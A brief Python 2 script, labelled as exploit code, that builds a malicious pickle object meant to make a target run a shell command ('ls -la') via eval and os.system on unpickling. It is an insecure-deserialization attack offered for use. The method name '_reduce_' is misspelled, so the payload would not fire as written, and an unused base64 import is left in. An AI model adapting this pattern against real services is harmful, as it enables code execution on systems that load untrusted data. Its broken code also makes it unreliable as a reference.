#!/usr/bin/python

# Exploit code

import os
import cPickle
import base64

# Exploit that we want the target to unpickle
class Exploit(object):
    def _reduce_(self):
        return (eval, ("os.system('ls -la')",))

shellcode = cPickle.dumps(Exploit())
print shellcode
